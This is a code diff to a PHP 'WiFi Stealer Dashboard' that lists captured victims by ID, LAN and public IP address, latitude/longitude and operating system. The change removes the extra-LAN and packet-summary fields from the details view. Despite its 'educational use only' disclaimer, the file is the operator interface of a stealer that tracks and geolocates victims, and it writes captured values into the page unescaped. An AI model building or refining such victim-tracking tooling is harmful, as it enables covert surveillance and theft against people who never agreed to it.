@@ -1,5 +1,5 @@
 <?php
-// WiFi Stealer Dashboard (victim ID + filters + location)
+// WiFi Stealer Dashboard (victim ID + location + minimal details)
 // DISCLAIMER: Educational use only. Use only on systems/networks you are authorized to test.
 
 date_default_timezone_set('Asia/Kolkata');
@@ -293,18 +293,16 @@ foreach ($captureEntries as $entry) {
     $filteredEntries[] = $entry;
 }
 
-// --- 8. Build JS data for details view ---
+// --- 8. Build JS data for minimal details view ---
 $jsDetails = [];
 foreach ($filteredEntries as $entry) {
     $jsDetails[] = [
-        'victim_id'    => $entry['victim_id'],
-        'ip_main'      => $entry['ip_main'],
-        'lan_ip_extra' => $entry['lan_ip_extra'],
-        'public_ip'    => $entry['public_ip'],
-        'latitude'     => $entry['latitude'],
-        'longitude'    => $entry['longitude'],
-        'pkt_summary'  => $entry['pkt_summary'],
-        'os'           => $entry['os'],
+        'victim_id'  => $entry['victim_id'],
+        'ip_main'    => $entry['ip_main'],
+        'public_ip'  => $entry['public_ip'],
+        'latitude'   => $entry['latitude'],
+        'longitude'  => $entry['longitude'],
+        'os'         => $entry['os'],
     ];
 }
 
@@ -547,10 +545,8 @@ $viewMode = 'basic';
             var html = '';
             html += '<div><strong>Victim ID:</strong> ' + row.victim_id + '</div>';
             html += '<div><strong>Victim LAN IP:</strong> ' + row.ip_main + '</div>';
-            html += '<div><strong>LAN extra:</strong> ' + row.lan_ip_extra + '</div>';
             html += '<div><strong>Public IP:</strong> ' + row.public_ip + '</div>';
             html += '<div><strong>Location:</strong> ' + row.latitude + ', ' + row.longitude + '</div>';
-            html += '<div><strong>Packet summary:</strong> ' + row.pkt_summary + '</div>';
             html += '<div><strong>OS:</strong> ' + row.os + '</div>';
 
             content.innerHTML = html;
